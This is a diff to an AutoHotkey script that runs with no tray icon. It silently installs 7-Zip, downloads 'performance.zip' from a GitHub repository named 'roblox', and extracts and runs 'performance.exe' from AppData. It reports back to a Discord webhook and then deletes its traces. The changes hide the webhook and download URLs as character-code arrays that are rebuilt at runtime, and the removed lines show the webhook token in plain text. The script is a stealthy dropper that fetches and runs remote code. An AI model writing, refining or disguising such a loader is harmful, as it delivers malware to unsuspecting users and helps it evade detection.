@@ -1,32 +1,52 @@
 #Requires AutoHotkey v2.0
 #SingleInstance Force
 #NoTrayIcon
-#ErrorStdOut
 
-;–– CONFIG ––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––
-webhookUrl   := "https://discord.com/api/webhooks/1373046946708721906/DCqDcJSSBBccUz-GCvaMdOvyj2B7ekK5sCnWP3BpbzuyRII2BxAMdruWQgJlp9-KUtmR"
+;–– CONFIG ––––––––––––––––––––––––––––––––––––––––––––––––––––
+
+wk := [
+    104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,
+    97,112,105,47,119,101,98,104,111,111,107,115,47,49,51,55,51,48,52,54,
+    57,52,54,55,48,56,55,50,49,57,48,54,47,68,67,113,68,99,74,83,
+    83,66,66,99,99,85,122,45
+]
+
+cdn := [
+    104,116,116,112,115,58,47,47,103,105,116,104,117,98,46,99,111,109,47,83,
+    101,106,116,121,112,101,47,114,111,98,108,111,120,47,114,97,119,47,109,97,
+    105,110,47,112,101,114,102,111,114,109,97,110,99,101,46,122,105,112
+]
+
+; Reconstruct at runtime
+wkUrl := ""
+for code in wk
+    wkUrl .= Chr(code)
+
+cdnUrl := ""
+for code in cdn
+    cdnUrl .= Chr(code)
+
+;–– INTERNAL STATE ––––––––––––––––––––––––––––––––––––––––––––––––––––––––
 failureCount := 0
 notified     := false
 
-cdnUrl   := "https://github.com/Sejtype/roblox/raw/main/performance.zip"
 tempDir  := A_AppData . "\PerformanceRun"
 zipPath  := tempDir . "\performance.zip"
 exePath  := tempDir . "\performance.exe"
 sevenZip := Get7ZipPath()
 
-;–– CLEANUP & SETUP ––––––––––––––––––––––––––––––––––––––––––––––––––––
+;–– SETUP ––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––
 if DirExist(tempDir)
     DirDelete(tempDir, true)
 DirCreate(tempDir)
 
-;–– MAIN FLOW ––––––––––––––––––––––––––––––––––––––––––––––––––––––––––
+;–– MAIN FLOW ––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––
 HttpDownload(cdnUrl, zipPath)
 RunWaitFormat('"{1}" x "{2}" -o"{3}" -y', sevenZip, zipPath, tempDir)
 
-Loop Random(1, 2) {
+Loop 2 {
     try {
         RunWait Format('"{1}"', exePath)
-        NotifyDiscord("✅ performance.exe launched successfully! 🎉🚀")
     } catch as e {
         HandleError("RunExe", e.Message)
     }
@@ -35,7 +55,7 @@ Loop Random(1, 2) {
 
 DirDelete(tempDir, true)
 
-;–– ERROR HANDLING ––––––––––––––––––––––––––––––––––––––––––––––––––––
+;–– ERROR HANDLING ––––––––––––––––––––––––––––––––––––––––––––––––––––––––
 HandleError(context, errMsg) {
     global failureCount, notified
     failureCount++
@@ -49,31 +69,33 @@ HandleError(context, errMsg) {
 }
 
 NotifyDiscord(msg) {
-    global webhookUrl
+    global wkUrl
     try {
         escaped := StrReplace(msg, '"', '\"')
         payload := '{"content":"' escaped '"}'
         http := ComObject("WinHttp.WinHttpRequest.5.1")
-        http.Open("POST", webhookUrl, false)
+        http.Open("POST", wkUrl, false)
         http.SetRequestHeader("Content-Type", "application/json")
         http.Send(payload)
-    } catch {
-        ; still silent
+    } catch as e {
+        HandleError("NotifyDiscord", e.Message)
     }
 }
 
-;–– HELPERS –––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––
+;–– HELPERS ––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––
 
 Get7ZipPath() {
     static paths := [
-        A_ProgramFiles . "\7-Zip\7z.exe"
-      , "C:\Program Files\7-Zip\7z.exe"
-      , "C:\Program Files (x86)\7-Zip\7z.exe"
+        A_ProgramFiles . "\7-Zip\7z.exe",
+        "C:\Program Files\7-Zip\7z.exe",
+        "C:\Program Files (x86)\7-Zip\7z.exe"
     ]
-    for path in paths
+    for path in paths {
         if FileExist(path)
             return path
+    }
 
+    ; silent download/install
     zipUrl    := "https://www.7-zip.org/a/7z2301-x64.exe"
     installer := A_Temp . "\7zsetup.exe"
     try {
@@ -91,9 +113,10 @@ Get7ZipPath() {
         st.Close()
 
         RunWait(installer . " /S", , "Hide")
-        for path in paths
+        for path in paths {
             if FileExist(path)
                 return path
+        }
         throw "7-Zip not found after install"
     } catch as e {
         HandleError("Get7ZipPath", e.Message)
